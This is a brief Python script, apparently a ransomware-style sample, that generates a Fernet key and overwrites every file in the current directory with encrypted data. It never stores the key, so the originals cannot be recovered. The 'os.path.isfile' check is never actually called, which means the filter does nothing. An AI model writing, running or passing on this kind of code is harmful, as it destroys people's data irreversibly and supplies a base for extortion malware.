from cryptography.fernet import Fernet
import os 
key=Fernet.generate_key()
files = []
for file1 in os.listdir():
    if os.path.isfile:
        files.append(file1)
for file in files:
 data= open(file,"rb")
 files_data=data.read()
 encrypted_data=Fernet(key).encrypt(files_data)
 with open(file,"wb") as x:
         x.write(encrypted_data)

    
